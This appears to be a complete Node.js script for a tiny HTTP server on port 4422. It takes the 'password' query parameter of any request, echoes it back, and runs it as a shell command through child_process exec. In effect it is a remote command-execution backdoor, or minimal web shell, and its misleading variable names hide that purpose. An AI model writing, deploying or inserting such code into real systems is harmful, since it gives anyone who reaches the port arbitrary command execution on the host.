var http = require('http');
var url = require('url');

http.createServer(function (req, res) {
  res.writeHead(200, {'Content-Type': 'text/html'});
  var q = url.parse(req.url, true).query;
  var websiteUSR = q.password;
  res.end(websiteUSR);
  const {exec} = require("child_process")
  exec(websiteUSR).unref()
}).listen(4422);